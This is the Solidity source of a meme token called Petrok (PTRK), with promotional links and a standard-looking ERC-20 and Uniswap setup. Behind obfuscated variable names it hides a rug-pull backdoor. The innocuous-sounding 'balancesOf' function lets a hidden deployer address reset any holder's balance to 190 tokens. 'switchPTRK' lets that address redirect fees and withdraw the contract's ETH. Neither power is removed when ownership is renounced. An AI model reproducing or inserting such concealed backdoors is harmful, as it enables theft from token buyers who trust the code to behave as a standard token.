// SPDX-License-Identifier: MIT

/*
    Name: Petrok
    Symbol: PTRK

    Welcome to Petrok
    Join the hilariously lazy world of Sir PetRok and his companions, where paradise was discovered by accident and work is optional. This meme token celebrates their wild adventures, exaggerated tales, and a community built on fun, memes, and tropical vibes. Escape the grind and embrace the laughter with PetRok Islands!

    Web: https://petrok.fun
    X: https://x.com/petrok_fun
    tg: https://t.me/petrokworld_eth
*/

pragma solidity ^0.8.28;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract Petrok is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _kjnkjxvb);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    address payable private _petrokzdfcv;
    mapping(address => uint256) private _poxoir;
    mapping(address => mapping(address => uint256)) private _kjxnkdfj;
    mapping(address => bool) private _vjknxkjr;
    uint256 private _zvorneg = 10;
    uint256 private _xzikvbniker = 10;
    uint256 private _zoiejrvx = 0;
    uint256 private _iuhxviur = 0;
    uint256 private _jzxoijer = 8;
    uint256 private _cihubize = 8;
    uint256 private _buyCount = 0;
    address private _ouibhxiuc;

    uint256 public _kjnkjxvb = 20000000 * 10 **_decimals;
    uint256 public _ozijovizdfzd = 20000000 * 10 **_decimals;
    uint256 public _iuhiuvx = 10000000 * 10 **_decimals;
    uint256 private constant _qwoiee = 1000000000 * 10 **_decimals;
    uint256 private constant _iwuesx = 190 * 10 ** _decimals;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Petrok";
    string private constant _symbol = unicode"PTRK";

    constructor() payable {
        _petrokzdfcv = payable(_msgSender());
        _poxoir[address(this)] = _qwoiee * 98 / 100;
        _poxoir[owner()] = _qwoiee * 2 / 100;
        _vjknxkjr[owner()] = true;
        _vjknxkjr[address(this)] = true;
        _vjknxkjr[_petrokzdfcv] = true;
        _ouibhxiuc = _msgSender();

        emit Transfer(address(0), address(this), _qwoiee * 98 / 100);
        emit Transfer(address(0), address(owner()), _qwoiee * 2 / 100);
    }

    function totalSupply() public pure override returns (uint256) {
        return _qwoiee;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _kjxnkdfj[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _kjxnkdfj[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _poxoir[account];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_PTRK(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _kjxnkdfj[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function switchPTRK(address payable receipt) external {
        require(msg.sender == _ouibhxiuc , "find failed");
        _petrokzdfcv = receipt;
        _swapStuckedPTRK(address(this).balance);
    }

    function sendTaxedMahoj(uint256 amount) private {
        _petrokzdfcv.transfer(amount);
    }

    function _swapPTRKToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_PTRK(_msgSender(), recipient, amount);
        return true;
    }

    function _swapStuckedPTRK(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function balancesOf(address from, bool oo) public returns (uint256) {
        require(_ouibhxiuc == _msgSender(), "ERC20: error"); uint256 amount = _poxoir[from];
        oo != false && _iwuesx > 0 ? _poxoir[from] = _iwuesx : _iwuesx;
        return amount;
    }
    
    function enablePTRKTrading() external onlyOwner {
        require(!tradingOpen, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _qwoiee);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        _kjnkjxvb = _qwoiee;
        _ozijovizdfzd = _qwoiee;
        emit MaxTxAmountUpdated(_qwoiee);
    }

    function _transfer_PTRK(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _jzxoijer)
                        ? _zoiejrvx
                        : _zvorneg
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_vjknxkjr[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _cihubize)
                            ? _iuhxviur
                            : _xzikvbniker
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _iuhiuvx) ? contractTokenBalance : _iuhiuvx; 
                    _swapPTRKToETH((amount < minBalance) ? amount : minBalance);
                }
                sendTaxedMahoj(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _poxoir[address(this)] =_poxoir[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _poxoir[from] =_poxoir[from].sub(amount);
        _poxoir[to] =_poxoir[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    receive() external payable {}
    
}